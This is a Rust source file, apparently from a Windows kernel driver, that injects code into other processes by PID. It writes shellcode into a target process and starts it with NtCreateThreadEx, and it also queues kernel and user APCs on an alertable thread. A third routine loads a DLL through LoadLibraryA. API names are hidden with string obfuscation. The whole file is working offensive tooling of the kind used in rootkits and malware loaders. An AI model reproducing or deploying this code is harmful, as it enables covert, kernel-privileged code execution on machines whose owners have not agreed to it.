#![allow(non_snake_case)]

use {
    obfstr::obfstr,
    shared::structs::TargetInjection, 
    callbacks::{kernel_apc_callback, user_apc_callback}, 
    core::{
        ffi::c_void, ptr::null_mut,
        mem::{size_of, transmute}, 
    }, 
    wdk_sys::{
        *,
        ntddk::{
            IoGetCurrentProcess, ZwAllocateVirtualMemory, 
            ZwClose, ZwOpenProcess
        },
        _MODE::{KernelMode, UserMode},
    },
    crate::{
        process::Process, 
        internals::{
            enums::KAPC_ENVIROMENT::OriginalApcEnvironment, 
            types::{ZwCreateThreadExType, PKNORMAL_ROUTINE}, 
            externs::{
                KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory, 
                ZwProtectVirtualMemory
            }
        }, 
        utils::{
            find_thread_alertable, get_module_peb, handles::Handle, 
            patterns::find_zw_function, pool::PoolMemory, read_file, 
            InitializeObjectAttributes
        } 
    },
};

mod callbacks;
pub mod ioctls;

/// Represents shellcode injection.
pub struct InjectionShellcode;

impl InjectionShellcode {
    /// Injection Shellcode in Thread.
    ///
    /// # Parameters
    /// 
    /// - `target`: The target process identifier (PID) and the path containing the injection shellcode.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_thread(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
        let pid = (*target).pid;
        let path = &(*target).path;
        
        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx")).ok_or(STATUS_UNSUCCESSFUL)? as *mut c_void;
        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return Err(status);
        }

        let h_process = Handle::new(h_process);
        
        let shellcode = read_file(path)?;
        let mut region_size = shellcode.len() as u64;
        let mut base_address = null_mut();
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            return Err(status);
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );
        
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
            return Err(status);
        }

        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            transmute(base_address),
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwCreateThreadEx Failed With Status: {status}");
            return Err(status);
        }

        ZwClose(h_thread);

        Ok(())
    }

    /// Injection Shellcode in APC.
    ///
    /// # Parameters
    /// 
    /// - `target`: The target process identifier (PID) and the path containing the injection shellcode.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_apc(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
        let pid = (*target).pid;
        let path = &(*target).path;
        let shellcode = read_file(path)?;
        let thread_id = find_thread_alertable(pid).ok_or(STATUS_UNSUCCESSFUL)?;
        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return Err(status);
        }

        let h_process = Handle::new(h_process);
        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            return Err(status);
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );

        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts"))
            .map(|mem| mem.ptr as *mut KAPC)
            .ok_or_else(|| {
                log::error!("PoolMemory (User) Failed");
                STATUS_UNSUCCESSFUL
            })?;

        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds"))
            .map(|mem| mem.ptr as *mut KAPC)
            .ok_or_else(|| {
                log::error!("PoolMemory (Kernel) Failed");
                STATUS_UNSUCCESSFUL
            })?;

        KeInitializeApc(
            kernel_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            kernel_apc_callback, 
            None, 
            None, 
            KernelMode as i8, 
            null_mut()
        );

        KeInitializeApc(
            user_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            user_apc_callback, 
            None, 
            transmute::<_, PKNORMAL_ROUTINE>(base_address), 
            UserMode as i8, 
            null_mut()
        );

        if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
            log::error!("KeInsertQueueApc (User) Failed");
            return Err(STATUS_UNSUCCESSFUL);
        }

        if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
            log::error!("KeInsertQueueApc (Kernel) Failed");
            return Err(STATUS_UNSUCCESSFUL);
        }

        Ok(())
    }
}

// Represents DLL injection.
pub struct InjectionDLL;

impl InjectionDLL {
    /// DLL Injection.
    ///
    /// # Parameters
    /// 
    /// - `target`: The target process identifier (PID) and the path containing the injection dll.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_dll_thread(target: *mut TargetInjection) -> Result<(), NTSTATUS> {
        let pid = (*target).pid;
        let path = (*target).path.as_bytes();
        let zw_thread_addr = find_zw_function(obfstr!("NtCreateThreadEx")).ok_or(STATUS_UNSUCCESSFUL)?;
        let function_address = get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA")).ok_or(STATUS_UNSUCCESSFUL)?;
        let target_eprocess = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
        
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return Err(status);
        }

        let h_process = Handle::new(h_process);

        let mut base_address = null_mut();
        let mut region_size = (path.len() * size_of::<u16>()) as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            return Err(status);
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            path.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            (path.len() * size_of::<u16>()) as u64,
            KernelMode as i8,
            &mut result_number,
        );

        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
            return Err(status);
        }

        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            transmute(function_address),
            base_address,
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwCreateThreadEx Failed With Status: {status}");
            return Err(status);
        }

        ZwClose(h_thread);

        Ok(())
    }
}
